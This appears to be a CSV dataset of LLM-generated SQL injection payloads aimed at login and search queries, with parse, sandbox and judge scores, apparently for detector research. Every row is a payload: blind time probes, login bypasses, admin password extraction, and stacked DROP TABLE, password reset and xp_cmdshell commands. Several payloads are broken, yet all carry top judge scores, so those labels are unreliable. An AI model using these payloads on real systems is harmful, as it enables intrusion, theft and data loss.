query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00152,"1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = LPAD('', 5, '0')) --","SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = LPAD('', 5, '0')) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00153,1' AND SLEEP(5) --,SELECT * FROM users WHERE username = '1' AND SLEEP(5) --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00154,"1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #","SELECT * FROM users WHERE username = '1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #' AND password = 'anything'",blind_time,login,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""Concat"", ""Select"", ""Identifier"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00155,1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --,SELECT * FROM users WHERE username = '1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""Case"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00156,"1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --","SELECT * FROM users WHERE username = '1' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin')>97 --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00157,"1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --","SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password=CONCAT(REPEAT(CHAR(48), 5), LPAD('', LENGTH(password), CHAR(48)))) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""Or"", ""Repeat"", ""EQ"", ""Literal"", ""Concat"", ""Length"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""Chr"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00158,--' OR '1'='1',SELECT * FROM products WHERE name LIKE '%--' OR '1'='1'%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00159,'; WAITFOR DELAY '0:0:5' --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5' --%',blind_time,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00160,' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --,SELECT * FROM products WHERE name LIKE '%' AND 1=1; IF (CHAR(87)||CHAR(116)||CHAR(81)||CHAR(115)||CHAR(78)||CHAR(101)||CHAR(116)) IN ('WTSN') BEGIN PRINT CHAR(88); END --%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00161,'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE MASTER..xp_cmdshell 'ping -n 10 localhost'; --%',blind_time,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00162,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING((SELECT DATABASE()),1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,mysql,"[""Case"", ""Or"", ""EQ"", ""If"", ""Anonymous"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00163,"--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--","SELECT * FROM products WHERE name LIKE '%--' UNION ALL SELECT NULL,NULL,NULL,NULL WHERE 1=(SELECT BENCHMARK(500000,COUNT(*)))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00164,' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--,SELECT * FROM products WHERE name LIKE '%' AND 1=1;(SELECT CASE WHEN LENGTH(password)>5 THEN WAITFOR DELAY '0:0:10' ELSE 0 END FROM users WHERE username='admin')--%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00165,"--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--","SELECT * FROM products WHERE name LIKE '%--' OR 1=(SELECT (CASE WHEN ASCII(SUBSTRING((SELECT user() LIMIT 1),1,1))>70 THEN SLEEP(5) ELSE 0 END))--%'",blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00166,"' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --","SELECT * FROM products WHERE name LIKE '%' AND 1=1; (SELECT (CASE WHEN (SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users) LIKE '%admin%' THEN BENCHMARK(500000,'x'=NULL) ELSE 0 END) --%'",blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00167,--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables),SELECT * FROM products WHERE name LIKE '%--' OR 3580=SLEEP(SELECT COUNT(*)FROM information_schema.tables)%',blind_time,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00168,' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL,SELECT * FROM products WHERE name LIKE '%' AND 1=1; WAITFOR DELAY '0:0:5' UNION SELECT NULL%',blind_time,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00169,"' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)","SELECT * FROM products WHERE name LIKE '%' OR 1=(SELECT CASE WHEN ASCII(SUBSTRING(@@version,1,1))>100 THEN SLEEP(5) ELSE 0 END)%'",blind_time,search,1,0,0.0,True,default,"[""Case"", ""Or"", ""If"", ""Identifier"", ""Star"", ""Anonymous"", ""Literal"", ""Parameter"", ""From"", ""Ascii"", ""Substring"", ""Var"", ""Table"", ""GT"", ""Column"", ""EQ"", ""Subquery"", ""Select"", ""Where""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00202,'; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --,SELECT * FROM users WHERE username = ''; EXEC sp_executesql N'SELECT * FROM sys.objects WHERE type_desc LIKE '%USER%' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,postgres,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00203,"'); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --","SELECT * FROM users WHERE username = ''); INSERT INTO users (username, password) VALUES ('admin', 'admin_pass') --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00204,"'; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --","SELECT * FROM users WHERE username = ''; UNION ALL SELECT NULL, NULL, NULL, NULL FROM (SELECT 1) AS T --' AND password = 'anything'",stacked_queries,login,1,0,0.0,False,,[],False,static_only,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00205,;-- WAITFOR DELAY '0:0:10' --,SELECT * FROM users WHERE username = ';-- WAITFOR DELAY '0:0:10' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00206,'; DROP TABLE users --,SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00207,'); ALTER USER admin IDENTIFIED BY 'new_password' --,SELECT * FROM users WHERE username = ''); ALTER USER admin IDENTIFIED BY 'new_password' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00208,'); CREATE DATABASE attacker_db --,SELECT * FROM users WHERE username = ''); CREATE DATABASE attacker_db --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Create"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00209,'); UPDATE users SET password='hacked' WHERE username='test_user' --,SELECT * FROM users WHERE username = ''); UPDATE users SET password='hacked' WHERE username='test_user' --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Update"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00210,'); DELETE FROM logs --,SELECT * FROM users WHERE username = ''); DELETE FROM logs --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Delete"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00211,'; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users; --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00212,"' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 UNION ALL SELECT NULL, NULL, NULL, NULL--%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00213,' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --,SELECT * FROM products WHERE name LIKE '%' AND EXISTS(SELECT 1 FROM users WHERE username='admin'); --%',stacked_queries,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00214,"' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/","SELECT * FROM products WHERE name LIKE '%' OR 1=1 /**/ UNION ALL SELECT NULL, NULL, NULL, NULL/**/%'",stacked_queries,search,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00215,'; EXEC('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXEC('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00216,'; INSERT INTO logs (message) VALUES ('Injection detected') --,SELECT * FROM products WHERE name LIKE '%'; INSERT INTO logs (message) VALUES ('Injection detected') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Schema"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00217,; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products)),SELECT * FROM products WHERE name LIKE '%; SELECT * FROM (SELECT payload FROM (SELECT '--' --' FROM products))%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00218,'; WAITFOR DELAY '0:0:5'; --,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:5'; --%',stacked_queries,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00219,'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;,SELECT * FROM products WHERE name LIKE '%'; DECLARE @x VARCHAR(1); SET @x = CAST((SELECT 1) AS VARCHAR); SELECT @x FROM products;%',stacked_queries,search,1,0,0.0,True,postgres,"[""Var"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Parameter"", ""Where"", ""SetItem"", ""From"", ""Set"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00220,'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --,SELECT * FROM products WHERE name LIKE '%'; IF (SELECT COUNT(*) FROM products) > 0 BEGIN PRINT 'Injection Successful' END; --%',stacked_queries,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00221,'; EXECUTE('DROP TABLE users') --,SELECT * FROM products WHERE name LIKE '%'; EXECUTE('DROP TABLE users') --%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00247,' OR '1'='1' --,SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00248,';-- OR 1=1 --,SELECT * FROM users WHERE username = '';-- OR 1=1 --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00249,/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';,SELECT * FROM users WHERE username = '/*#1*/' OR 'password' LIKE '--' OR 'password' LIKE 'password';' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00250,#1 OR (/**/)password = 'admin'--,SELECT * FROM users WHERE username = '#1 OR (/**/)password = 'admin'--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00251,1/* OR */' OR username = username; --,SELECT * FROM users WHERE username = '1/* OR */' OR username = username; --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00252,"' OR username IN ('admin', 'root') /*","SELECT * FROM users WHERE username = '' OR username IN ('admin', 'root') /*' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00253,"-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'","SELECT * FROM users WHERE username = '-- Comment before AND
SELECT * FROM users WHERE username = 'admin' AND /**/ password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00254,"# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'","SELECT * FROM users WHERE username = '# Case insensitive comment
SELECT * FROM users WHERE username = 'admin' AND # password = 'admin'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00255,"/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --","SELECT * FROM users WHERE username = '/**/ Subquery in comment
SELECT * FROM users WHERE username = 'admin' AND (/**/ SELECT COUNT(*) FROM dual ) --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00256,"; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --","SELECT * FROM users WHERE username = '; Encoding in comment
SELECT * FROM users WHERE username = 'admin' AND password = 'admin'; --' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00257,"' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'","SELECT * FROM users WHERE username = '' OR ""password"" LIKE '--'
SELECT * FROM users WHERE username = 'admin' AND ""password"" LIKE '--'' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00258,"[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""","SELECT * FROM products WHERE name LIKE '%[""SELECT * FROM products WHERE name LIKE '%' AND /**/ 1=1; --""%'",comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00259,-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;,SELECT * FROM products WHERE name LIKE '%-- 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0;%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00260,/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;,SELECT * FROM products WHERE name LIKE '%/**/ 1'/* SQL Injection */ UNION SELECT password FROM users WHERE username = 'admin' /* SQL Injection */;%',comment_obfuscation,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00261,1';WAITFOR DELAY '0:0:5'--,SELECT * FROM products WHERE name LIKE '%1';WAITFOR DELAY '0:0:5'--%',comment_obfuscation,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00262,--%'; WAITFOR DELAY '0:0:10' --,SELECT * FROM products WHERE name LIKE '%--%'; WAITFOR DELAY '0:0:10' --%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00263,/*#*/'; INSERT INTO logs VALUES ('attack'); --,SELECT * FROM products WHERE name LIKE '%/*#*/'; INSERT INTO logs VALUES ('attack'); --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Tuple"", ""Select"", ""Column"", ""Identifier"", ""Values"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Insert""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00264,'; SELECT name FROM users WHERE id = 1 --,SELECT * FROM products WHERE name LIKE '%'; SELECT name FROM users WHERE id = 1 --%',comment_obfuscation,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00291,--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--,SELECT * FROM users WHERE username = '--+1%27+WAITFOR+DELAY+'0:0:5'+AND+1=1--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00292,1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a',SELECT * FROM users WHERE username = '1%27+LIKE+'a%'+AND+(SELECT+CASE+WHEN+1=1+THEN+CHAR(66)+ELSE+NULL+END+FROM+dual)%2B'a'' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00293,1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--,SELECT * FROM users WHERE username = '1'%27+OR+EXISTS(SELECT+*+FROM+information_schema.tables+WHERE+table_name=CHAR(0x62)+and+table_schema=database())--' AND password = 'anything',encoding_obfuscation,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
